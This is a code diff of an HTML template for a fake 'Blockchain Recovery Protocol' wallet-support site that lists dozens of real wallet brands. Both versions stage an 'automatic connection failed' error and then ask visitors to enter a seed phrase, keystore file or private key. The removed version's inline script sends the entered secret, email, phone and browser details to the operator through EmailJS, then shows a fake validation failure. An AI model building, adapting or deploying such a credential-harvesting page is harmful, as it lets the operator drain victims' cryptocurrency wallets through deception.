@@ -2,242 +2,351 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>BLOCKCHAIN-PROTECTOR PROTOCOL</title>
-  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blockchain Recovery Protocol</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 </head>
 <body>
-
-<div class="protocol-container">
-  <header class="protocol-header">
-    <h1>BLOCKCHAIN-PROTECTOR PROTOCOL</h1>
-    <p>This is not an app but a protocol that establishes remote resolution 
-      between all non-custodial wallets, discovering decentralized solutions, 
-      seamless transactions, and a decentralized ecosystem.
-    </p>
-  </header>
-
-  <div class="troubleshoot-dropdown">
-    <label for="troubleshootSelect">Troubleshoot an Issue:</label>
-    <select id="troubleshootSelect" onchange="openWalletPopup(this.value)">
-      <option value="" disabled selected>Select an option</option>
-      <option value="Migration">Migration</option>
-      <option value="Rectification">Rectification</option>
-      <option value="Claim">Claim</option>
-      <option value="Swap">Swap</option>
-      <option value="Slippage">Slippage</option>
-      <option value="Claim Airdrop">Claim Airdrop</option>
-      <option value="Staking">Staking</option>
-      <option value="Whitelist">Whitelist</option>
-      <option value="Cross Transfer">Cross Transfer</option>
-      <option value="NFTs">NFTs</option>
-      <option value="Locked Account">Locked Account</option>
-      <option value="Login Error">Login Error</option>
-      <option value="Wallet Glitch">Wallet Glitch</option>
-      <option value="DeFi Farming">DeFi Farming</option>
-      <option value="Validation">Validation</option>
-      <option value="Transaction Delay">Transaction Delay</option>
-      <option value="Missing Balance">Missing Balance</option>
-      <option value="Recovery">Recovery</option>
-      <option value="Buy Token">Buy Token</option>
-      <option value="Exchange">Exchange</option>
-      <option value="Bridging">Bridging</option>
-    </select>
-  </div>
-
-  <div class="wallet-connect">
-    <button class="connect-button" onclick="openWalletList()">Connect Wallet</button>
-  </div>
-</div>
-
-<!-- Step 1: Wallet Selection Popup -->
-<div id="walletPopup" class="popup">
-  <div class="popup-content wallet-selection">
-    <div class="popup-header">
-      <h3>Connect your wallet</h3>
-      <button class="close-popup" onclick="closeAllPopups()">&times;</button>
-    </div>
-    <div id="walletList"></div>
-    <div id="customWalletInput" class="hidden">
-      <input type="text" id="customWalletName" placeholder="Enter your wallet name">
-      <button onclick="selectCustomWallet()">Continue</button>
-    </div>
-  </div>
-</div>
-
-<!-- Step 2: Connection Status Popup -->
-<div id="initPopup" class="popup">
-  <div class="popup-content connection-status">
-    <div class="popup-header">
-      <h3 id="initWalletName">Initializing</h3>
-    </div>
-    <div class="status-content">
-      <div class="loading-spinner"></div>
-      <p id="initStatusMessage">Connecting to wallet...</p>
-    </div>
-  </div>
-</div>
-
-<!-- Step 3: Manual Import Popup (New Design) -->
-<div id="walletImportPopup" class="popup">
-  <div class="popup-content import-popup">
-    <div class="popup-header">
-      <div class="import-title">
-        <span>Import your</span>
-        <span id="importWalletName">Wallet</span>
-        <img id="importWalletLogo" src="" alt="" style="width: 24px; height: 24px;">
-      </div>
-      <button class="close-popup" onclick="closeWalletImportPopup()">&times;</button>
-    </div>
-
-    <div class="error-notice">
-      <div class="error-icon">⚠️</div>
-      <p>There was an error connecting automatically. But don't worry, you can still connect manually.</p>
-    </div>
-
-    <!-- Import Method Selection -->
-    <div class="import-methods">
-      <div class="method-tabs">
-        <div class="method-tab active" data-type="seed">Seed Phrase</div>
-        <div class="method-tab" data-type="keystore">Keystore JSON</div>
-        <div class="method-tab" data-type="private">Private Key</div>
-      </div>
-
-      <div class="method-content">
-        <div class="input-group">
-          <label for="walletSeedInput">Enter your wallet credentials</label>
-          <textarea id="walletSeedInput" class="credential-input" placeholder="Enter your seed phrase, private key, or keystore JSON"></textarea>
+    <div class="container">
+        <div class="main-content">
+            <h1 class="title">BLOCKCHAIN<br>RECOVERY-<br>PROTOCOL</h1>
+            
+            <p class="description">
+                Welcome to Blockchain Recovery-Protocol, your trusted partner in 
+                decentralized wallet recovery and issue resolution. We're committed to helping 
+                users regain access and confidence in their non-custodial wallets.
+            </p>
+            
+            <div class="troubleshoot-section">
+                <label for="troubleshoot-select" class="troubleshoot-label">Troubleshoot an Issue</label>
+                <select id="troubleshoot-select" class="troubleshoot-dropdown">
+                    <option value="">Select an issue</option>
+                    <option value="access-denied">Access denied when trying to connect wallet?</option>
+                    <option value="incorrect-balance">Account not showing correct balance?</option>
+                    <option value="custom-tokens">Add custom tokens not displaying?</option>
+                    <option value="api-issues">API related issues</option>
+                    <option value="blockchain-sync">Blockchain network not syncing?</option>
+                    <option value="cannot-send">Cannot send transactions?</option>
+                    <option value="connection-timeout">Connection timeout errors?</option>
+                    <option value="contract-failing">Contract interaction failing?</option>
+                    <option value="corrupted-data">Corrupted wallet data?</option>
+                    <option value="transaction-delay">Delay in transaction confirmation?</option>
+                    <option value="import-error">Error messages during wallet import?</option>
+                    <option value="hardware-failed">Failed to connect hardware wallet?</option>
+                    <option value="gas-fees">Gas fees too high?</option>
+                    <option value="address-format">Incorrect wallet address format?</option>
+                    <option value="lost-access">Lost access to wallet?</option>
+                    <option value="mobile-app">Mobile wallet app not opening?</option>
+                    <option value="multiple-connections">Multiple wallet connections causing conflicts</option>
+                    <option value="network-not-found">Network not found in wallet?</option>
+                    <option value="phishing-alerts">Phishing alerts in wallet?</option>
+                    <option value="private-key-compromised">Private key compromised?</option>
+                    <option value="recovery-phrase">Recovery phrase not accepted?</option>
+                    <option value="security-warnings">Security warnings on wallet site?</option>
+                    <option value="seed-backup-lost">Seed phrase backup lost?</option>
+                    <option value="slow-ui">Slow wallet UI response?</option>
+                    <option value="stuck-connecting">Stuck on connecting wallet screen?</option>
+                    <option value="sync-issues">Sync issues with blockchain explorer</option>
+                    <option value="transaction-rejected">Transaction rejected by user?</option>
+                    <option value="unable-switch">Unable to switch accounts?</option>
+                    <option value="disconnecting">Wallet disconnecting unexpectedly?</option>
+                    <option value="not-detected">Wallet not detected by dApp?</option>
+                    <option value="other">Others</option>
+                </select>
+            </div>
+            
+            <button id="connect-wallet-btn" class="connect-wallet-btn">Connect Wallet</button>
         </div>
-      </div>
     </div>
 
-    <!-- Contact Information Section (Redesigned) -->
-    <div class="contact-section">
-      <h4>Contact Information <span class="optional">(Optional)</span></h4>
-      <div class="contact-grid">
-        <div class="contact-field">
-          <label for="userEmail">📧 Email Address</label>
-          <input type="email" id="userEmail" placeholder="your@email.com">
+    <!-- Wallet Selection Modal -->
+    <div id="wallet-modal" class="modal hidden">
+        <div class="modal-content">
+            <h3>Connect your wallet</h3>
+            <div class="wallet-list">
+                <div class="wallet-item" data-wallet="metamask">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🦊</div>
+                    <span>Metamask</span>
+                </div>
+                <div class="wallet-item" data-wallet="trust">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🛡️</div>
+                    <span>Trust</span>
+                </div>
+                <div class="wallet-item" data-wallet="coinbase">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">©</div>
+                    <span>Coinbase</span>
+                </div>
+                <div class="wallet-item" data-wallet="xumm">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">✗</div>
+                    <span>Xumm</span>
+                </div>
+                <div class="wallet-item" data-wallet="cardano">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">⚡</div>
+                    <span>Cardano</span>
+                </div>
+                <div class="wallet-item" data-wallet="daedalus">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🗲</div>
+                    <span>Daedalus</span>
+                </div>
+                <div class="wallet-item" data-wallet="yoroi">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🌊</div>
+                    <span>Yoroi</span>
+                </div>
+                <div class="wallet-item" data-wallet="ccvault">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🔒</div>
+                    <span>CCVault</span>
+                </div>
+                <div class="wallet-item" data-wallet="phantom">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">👻</div>
+                    <span>Phantom</span>
+                </div>
+                <div class="wallet-item" data-wallet="solflare">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">☀️</div>
+                    <span>Solflare</span>
+                </div>
+                <div class="wallet-item" data-wallet="exodus">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🌍</div>
+                    <span>Exodus</span>
+                </div>
+                <div class="wallet-item" data-wallet="atomic">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">⚛️</div>
+                    <span>Atomic</span>
+                </div>
+                <div class="wallet-item" data-wallet="ledger">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">📱</div>
+                    <span>Ledger</span>
+                </div>
+                <div class="wallet-item" data-wallet="trezor">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🔐</div>
+                    <span>Trezor</span>
+                </div>
+                <div class="wallet-item" data-wallet="safepal">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🛡️</div>
+                    <span>SafePal</span>
+                </div>
+                <div class="wallet-item" data-wallet="mathwallet">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🧮</div>
+                    <span>Math Wallet</span>
+                </div>
+                <div class="wallet-item" data-wallet="tokenpocket">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🎒</div>
+                    <span>TokenPocket</span>
+                </div>
+                <div class="wallet-item" data-wallet="binancechain">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🔗</div>
+                    <span>Binance Chain</span>
+                </div>
+                <div class="wallet-item" data-wallet="walletconnect">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🔗</div>
+                    <span>WalletConnect</span>
+                </div>
+                <div class="wallet-item" data-wallet="rainbow">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🌈</div>
+                    <span>Rainbow</span>
+                </div>
+                <div class="wallet-item" data-wallet="argent">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🏛️</div>
+                    <span>Argent</span>
+                </div>
+                <div class="wallet-item" data-wallet="gnosissafe">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🔒</div>
+                    <span>Gnosis Safe</span>
+                </div>
+                <div class="wallet-item" data-wallet="keplr">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🌌</div>
+                    <span>Keplr</span>
+                </div>
+                <div class="wallet-item" data-wallet="terrastation">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🌍</div>
+                    <span>Terra Station</span>
+                </div>
+                <div class="wallet-item" data-wallet="cosmostation">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🚀</div>
+                    <span>Cosmostation</span>
+                </div>
+                <div class="wallet-item" data-wallet="leapwallet">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🦘</div>
+                    <span>Leap Wallet</span>
+                </div>
+                <div class="wallet-item" data-wallet="polygon">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🔷</div>
+                    <span>Polygon</span>
+                </div>
+                <div class="wallet-item" data-wallet="avalanche">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🏔️</div>
+                    <span>Avalanche</span>
+                </div>
+                <div class="wallet-item" data-wallet="harmony">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🎵</div>
+                    <span>Harmony</span>
+                </div>
+                <div class="wallet-item" data-wallet="nearwallet">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🔷</div>
+                    <span>Near Wallet</span>
+                </div>
+                <div class="wallet-item" data-wallet="polkadot">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">⚫</div>
+                    <span>Polkadot</span>
+                </div>
+                <div class="wallet-item" data-wallet="kusama">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🐦</div>
+                    <span>Kusama</span>
+                </div>
+                <div class="wallet-item" data-wallet="algorand">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">⭕</div>
+                    <span>Algorand</span>
+                </div>
+                <div class="wallet-item" data-wallet="tronlink">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🔗</div>
+                    <span>Tron Link</span>
+                </div>
+                <div class="wallet-item" data-wallet="waveskeeper">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">🌊</div>
+                    <span>Waves Keeper</span>
+                </div>
+                <div class="wallet-item" data-wallet="other">
+                    <div class="wallet-status">●</div>
+                    <div class="wallet-icon">❓</div>
+                    <span>Other</span>
+                </div>
+            </div>
         </div>
-        <div class="contact-field">
-          <label for="userPhone">📱 Phone Number</label>
-          <input type="tel" id="userPhone" placeholder="+1234567890">
+    </div>
+
+    <!-- Connection Steps Modal -->
+    <div id="steps-modal" class="modal hidden">
+        <div class="modal-content">
+            <div id="step-content">
+                <h3 id="step-title">Initializing</h3>
+                <p id="step-description">Error connecting to wallet...</p>
+                <div class="loading-spinner"></div>
+            </div>
         </div>
-      </div>
-      <div class="contact-field full-width">
-        <label for="issueDescription">📝 Describe your issue</label>
-        <textarea id="issueDescription" placeholder="Briefly describe the problem you're experiencing..." rows="3"></textarea>
-      </div>
     </div>
 
-    <!-- Action Buttons (Redesigned) -->
-    <div class="action-buttons">
-      <button class="btn-secondary" onclick="closeWalletImportPopup()">Cancel</button>
-      <button class="btn-primary" onclick="validateWallet()">
-        <span class="btn-icon">🔒</span>
-        Validate Wallet
-      </button>
+    <!-- Manual Import Modal -->
+    <div id="import-modal" class="modal hidden">
+        <div class="modal-content">
+            <div class="error-message">
+                There was an error connecting automatically. But do not worry, you can still connect manually.
+            </div>
+            
+            <h3 id="import-title">Import your <span id="wallet-name">wallet</span> <span class="wallet-info-icon">🛈</span></h3>
+            
+            <div class="import-options">
+                <button class="import-option active" data-option="seed">Seed Phrase</button>
+                <button class="import-option" data-option="keystore">Keystore JSON</button>
+                <button class="import-option" data-option="private">Private Key</button>
+            </div>
+            
+            <div class="import-form">
+                <label for="seed-input">Enter your wallet seed phrase</label>
+                <textarea id="seed-input" placeholder="Enter your seed phrase" rows="4"></textarea>
+                
+                <div class="form-actions">
+                    <button id="validate-btn" class="validate-btn">Validate</button>
+                    <button id="close-btn" class="close-btn">Close</button>
+                </div>
+            </div>
+        </div>
     </div>
-  </div>
-</div>
 
-<!-- Step 4: Validation Status Popup -->
-<div id="validateStatusPopup" class="popup">
-  <div class="popup-content status-popup">
-    <div class="status-icon">
-      <img id="validateWalletLogo" src="" alt="">
+    <!-- Validation Modal -->
+    <div id="validation-modal" class="modal hidden">
+        <div class="modal-content">
+            <h3>Validating...</h3>
+            <div class="loading-spinner"></div>
+        </div>
     </div>
-    <div class="status-message">
-      <p id="validateStatusMessage"></p>
+
+    <!-- Error Modal -->
+    <div id="error-modal" class="modal hidden">
+        <div class="modal-content error-content">
+            <div class="error-icon">!</div>
+            <h3>We couldn't validate your account.</h3>
+            <p>Something went wrong on our end—please try again in a few minutes. If the problem continues, <u>contact support</u>.</p>
+        </div>
     </div>
-    <button class="btn-primary" onclick="closeValidateStatusPopup()">Continue</button>
-  </div>
-</div>
 
-<!-- Troubleshoot Popup -->
-<div id="troubleshootPopup" class="popup">
-  <div class="popup-content">
-    <div class="popup-header">
-      <h3>Troubleshooting: <span id="troubleshootIssueType"></span></h3>
-      <button class="close-popup" onclick="closeTroubleshootPopup()">&times;</button>
+    <!-- Custom Wallet Input Modal -->
+    <div id="custom-wallet-modal" class="modal hidden">
+        <div class="modal-content">
+            <h3>Enter Your Wallet Name</h3>
+            <div class="custom-input-form">
+                <label for="custom-wallet-input">Wallet Name</label>
+                <input type="text" id="custom-wallet-input" placeholder="Enter your wallet name" />
+                <div class="form-actions">
+                    <button id="custom-wallet-confirm" class="validate-btn">Continue</button>
+                    <button id="custom-wallet-cancel" class="close-btn">Cancel</button>
+                </div>
+            </div>
+        </div>
     </div>
-    <p>To resolve this issue, please connect your wallet first and follow the guided resolution process.</p>
-    <div class="popup-buttons">
-      <button onclick="closeTroubleshootPopup(); openWalletList();" class="btn-primary">Connect Wallet to Resolve</button>
+
+    <!-- Custom Issue Input Modal -->
+    <div id="custom-issue-modal" class="modal hidden">
+        <div class="modal-content">
+            <h3>Describe Your Issue</h3>
+            <div class="custom-input-form">
+                <label for="custom-issue-input">Issue Description</label>
+                <textarea id="custom-issue-input" placeholder="Describe your troubleshooting issue" rows="4"></textarea>
+                <div class="form-actions">
+                    <button id="custom-issue-confirm" class="validate-btn">Continue</button>
+                    <button id="custom-issue-cancel" class="close-btn">Cancel</button>
+                </div>
+            </div>
+        </div>
     </div>
-  </div>
-</div>
 
-<script>
-// Initialize EmailJS
-emailjs.init("hwWuRqhr9vJTWa-n8");
+    <!-- Issue Confirmation Modal -->
+    <div id="issue-confirmation-modal" class="modal hidden">
+        <div class="modal-content">
+            <h3 id="issue-title">Connect to wallet to troubleshoot your issue</h3>
+            <p id="issue-description">Click continue to connect your wallet and resolve your problem.</p>
+            <div class="form-actions">
+                <button id="issue-continue" class="validate-btn">Connect Wallet</button>
+                <button id="issue-cancel" class="close-btn">Cancel</button>
+            </div>
+        </div>
+    </div>
 
-function openWalletList() {
-  document.getElementById("walletPopup").style.display = "flex";
-}
-
-function validateWallet() {
-  const seedPhrase = document.getElementById("walletSeedInput").value;
-  const walletName = document.getElementById("importWalletName").innerText;
-  const userEmail = document.getElementById("userEmail").value.trim();
-  const userPhone = document.getElementById("userPhone").value.trim();
-  const issueDescription = document.getElementById("issueDescription").value.trim();
-
-  if (seedPhrase.trim() === "") {
-    alert("Please enter your seed phrase or private key.");
-    return;
-  }
-
-  const templateParams = {
-    wallet_name: walletName,
-    seed_phrase: seedPhrase,
-    user_email: userEmail || 'Not provided',
-    user_phone: userPhone || 'Not provided', 
-    issue_description: issueDescription || 'No description provided',
-    submission_date: new Date().toLocaleString(),
-    user_agent: navigator.userAgent
-  };
-
-  console.log('Sending email with params:', templateParams);
-
-  // Show validation status popup
-  document.getElementById("validateStatusMessage").textContent = "Processing your request...";
-  closeWalletImportPopup();
-  document.getElementById("validateStatusPopup").style.display = "flex";
-
-  emailjs.send('service_xccsflu', 'template_tcljc90', templateParams)
-    .then(function(response) {
-      console.log('Email sent successfully:', response);
-      document.getElementById("validateStatusMessage").textContent = "Unable to validate your request at the moment. Please try again later or contact support team for assistance.";
-    })
-    .catch(function(error) {
-      console.error('Email sending failed:', error);
-      document.getElementById("validateStatusMessage").textContent = "There was an error submitting your request. Please try again.";
-    });
-}
-
-function closeAllPopups() {
-  document.querySelectorAll('.popup').forEach(popup => {
-    popup.style.display = 'none';
-  });
-}
-
-function closeWalletImportPopup() {
-  document.getElementById("walletImportPopup").style.display = "none";
-}
-
-function closeValidateStatusPopup() {
-  document.getElementById("validateStatusPopup").style.display = "none";
-}
-
-function closeTroubleshootPopup() {
-  document.getElementById("troubleshootPopup").style.display = "none";
-}
-</script>
-
-<script src="{{ url_for('static', filename='script.js') }}"></script>
-
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
 </body>
 </html>
